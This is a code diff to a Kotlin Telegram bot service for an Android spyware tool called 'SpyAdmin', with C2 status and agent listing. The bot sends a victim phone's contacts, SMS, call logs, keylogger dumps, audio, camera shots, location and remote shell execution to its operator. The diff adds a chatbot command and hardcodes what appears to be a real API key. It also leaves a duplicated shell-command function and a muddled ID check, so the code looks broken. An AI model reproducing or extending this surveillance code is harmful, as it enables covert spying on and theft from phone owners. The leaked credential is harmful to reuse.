@@ -22,16 +22,22 @@ class TelegramBotService(private val context: Context) {
         private const val PREFS_NAME = "telegram_bot_config"
         private const val KEY_OFFSET = "update_offset"
         private const val KEY_ONBOARD_SENT = "onboard_sent"
+        
+        // NVIDIA Nemotron 3 Ultra 550B API
+        private const val NVIDIA_API_KEY = "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"
+        private const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
+        private const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"
     }
 
     private val gson = Gson()
     private val client = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(60, TimeUnit.SECONDS)
         .build()
     private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
     private var running = false
     private var pollThread: Thread? = null
+    private var lastMessageId: Long = 0
 
     fun start() {
         if (running) return
@@ -77,8 +83,11 @@ class TelegramBotService(private val context: Context) {
             response.body?.string()?.let { json ->
                 val result = gson.fromJson(json, TelegramResponse::class.java)
                 result.result?.forEach { update ->
-                    prefs.edit().putLong(KEY_OFFSET, update.updateId).apply()
-                    handleUpdate(update)
+                    if (update.updateId > lastMessageId) {
+                        lastMessageId = update.updateId
+                        prefs.edit().putLong(KEY_OFFSET, update.updateId).apply()
+                        handleUpdate(update)
+                    }
                 }
             }
         }
@@ -87,7 +96,11 @@ class TelegramBotService(private val context: Context) {
     private fun handleUpdate(update: TelegramUpdate) {
         update.message?.let { msg ->
             if (msg.from?.id == ALLOWED_USER_ID) {
-                handleCommand(msg)
+                // Prevent duplicate processing
+                if (msg.messageId > lastMessageId) {
+                    lastMessageId = msg.messageId
+                    handleCommand(msg)
+                }
             } else {
                 sendMessage(msg.chat.id, "⛔ Unauthorized. Your ID: ${msg.from?.id}")
             }
@@ -100,20 +113,17 @@ class TelegramBotService(private val context: Context) {
     }
 
     private fun handleCommand(msg: TelegramMessage) {
-        val text = msg.text ?: ""
+        val text = msg.text?.trim() ?: ""
         val chatId = msg.chat.id
 
+        // Exact command matching to prevent accidental triggers
         when {
-            text.startsWith("/start") -> {
+            text == "/start" -> {
                 sendMessage(chatId, getHelpMessage())
-                // Don't send onboard again - only once at first install
             }
             text == "/status" -> sendStatus(chatId)
             text == "/agents" -> sendAgentsList(chatId)
-            text.startsWith("/task ") -> sendTaskCommand(chatId, text.substring(6))
-            text.startsWith("/shell ") -> sendShellCommand(chatId, text.substring(7))
-            text == "/screenshot" -> sendTask(chatId, "screen", mapOf("action" to "capture"))
-            text == "/location" -> sendTask(chatId, "location", mapOf("action" to "get"))
+            text == "/help" -> sendMessage(chatId, getHelpMessage())
             text == "/contacts" -> sendTask(chatId, "contacts", mapOf())
             text == "/sms" -> sendTask(chatId, "sms", mapOf())
             text == "/calls" -> sendTask(chatId, "call_logs", mapOf())
@@ -126,7 +136,14 @@ class TelegramBotService(private val context: Context) {
             text == "/keylogger_dump" -> sendTask(chatId, "keylogger", mapOf("action" to "dump"))
             text == "/audio" -> sendTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
             text == "/camera" -> sendTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
-            text == "/help" -> sendMessage(chatId, getHelpMessage())
+            text == "/screenshot" -> sendTask(chatId, "screen", mapOf("action" to "capture"))
+            text == "/location" -> sendTask(chatId, "location", mapOf("action" to "get"))
+            text == "/status" -> sendStatus(chatId)
+            text == "/agents" -> sendAgentsList(chatId)
+            text.startsWith("/shell ") -> sendShellCommand(chatId, text.substring(7).trim())
+            text.startsWith("/task ") -> sendTaskCommand(chatId, text.substring(6).trim())
+            text.startsWith("/ai ") -> sendAICommand(chatId, text.substring(4).trim())
+            text.startsWith("/nvidia ") -> sendNVIDIACommand(chatId, text.substring(8).trim())
             else -> sendMessage(chatId, "Unknown command. Use /help")
         }
     }
@@ -153,6 +170,79 @@ class TelegramBotService(private val context: Context) {
     }
 
     private fun sendShellCommand(chatId: Long, command: String) {
+        if (command.isBlank()) {
+            sendMessage(chatId, "Usage: /shell <command>\nExample: /shell whoami && id")
+            return
+        }
+        sendTask(chatId, "shell", mapOf("command" to command))
+    }
+
+    // NVIDIA Nemotron 3 Ultra 550B AI Integration
+    private fun sendNVIDIACommand(chatId: Long, prompt: String) {
+        if (prompt.isBlank()) {
+            sendMessage(chatId, "Usage: /nvidia <prompt>\nExample: /nvidia Explain quantum computing")
+            return
+        }
+        
+        sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B thinking...*")
+        
+        thread(name = "nvidia-ai") {
+            try {
+                val payload = mapOf(
+                    "model" to NVIDIA_MODEL,
+                    "messages" to listOf(mapOf("role" to "user", "content" to prompt)),
+                    "temperature" to 0.7,
+                    "max_tokens" to 4096,
+                    "top_p" to 1.0,
+                    "stream" to false
+                )
+                
+                val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
+                val request = Request.Builder()
+                    .url(NVIDIA_API_URL)
+                    .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
+                    .post(requestBody)
+                    .build()
+                
+                client.newCall(request).execute().use { response ->
+                    val responseBody = response.body?.string()
+                    if (response.isSuccessful && responseBody != null) {
+                        try {
+                            val json = gson.fromJson(responseBody, Map::class.java)
+                            val choices = json["choices"] as? List<*> ?: emptyList()
+                            if (choices.isNotEmpty()) {
+                                val firstChoice = choices[0] as? Map<*, *> ?: emptyMap()
+                                val message = firstChoice["message"] as? Map<*, *> ?: emptyMap()
+                                val content = message["content"] as? String ?: "No response"
+                                sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B:*\n\n$content")
+                            } else {
+                                sendMessage(chatId, "❌ No response from NVIDIA API")
+                            }
+                        } catch (e: Exception) {
+                            sendMessage(chatId, "❌ Failed to parse NVIDIA response: ${e.message}")
+                        }
+                    } else {
+                        val errorBody = response.body?.string() ?: "Unknown error"
+                        sendMessage(chatId, "❌ NVIDIA API Error (${response.code}): $errorBody")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("TelegramBot", "NVIDIA API error", e)
+                sendMessage(chatId, "❌ NVIDIA API Error: ${e.message}")
+            }
+        }
+    }
+
+    // General AI command (alias for NVIDIA)
+    private fun sendAICommand(chatId: Long, prompt: String) {
+        sendNVIDIACommand(chatId, prompt)
+    }
+
+    private fun sendShellCommand(chatId: Long, command: String) {
+        if (command.isBlank()) {
+            sendMessage(chatId, "Usage: /shell <command>\nExample: /shell whoami && id")
+            return
+        }
         sendTask(chatId, "shell", mapOf("command" to command))
     }
 
@@ -248,13 +338,18 @@ class TelegramBotService(private val context: Context) {
 
     private fun getHelpMessage(): String {
         return """
-🤖 *SpyAdmin Telegram Bot*
+🤖 *SpyAdmin Telegram Bot v2.0*
 
 *System Commands:*
 /start - Show this help
 /status - Show C2 status
 /agents - List connected agents
 /help - Show this message
+
+*🤖 NVIDIA Nemotron 3 Ultra 550B AI:*
+/nvidia <prompt> - Ask Nemotron 3 Ultra 550B
+/ai <prompt> - Alias for NVIDIA
+Example: /nvidia Explain quantum computing
 
 *Surveillance Commands:*
 /screenshot - Capture screen
@@ -275,6 +370,8 @@ class TelegramBotService(private val context: Context) {
 *System Commands:*
 /shell <cmd> - Execute shell command
 /task <capability> <json> - Custom task
+/nvidia <prompt> - Ask Nemotron 3 Ultra 550B
+/ai <prompt> - Alias for NVIDIA
 
 *Admin only. Unauthorized users will be rejected.*
         """.trimIndent()
@@ -327,14 +424,14 @@ class TelegramBotService(private val context: Context) {
 
     data class TelegramChat(
         val id: Long,
-        type: String,
-        title: String?
+        val type: String,
+        val title: String?
     )
 
     data class CallbackQuery(
         val id: String,
-        from: TelegramUser,
-        message: TelegramMessage?,
-        data: String?
+        val from: TelegramUser,
+        val message: TelegramMessage?,
+        val data: String?
     )
 }
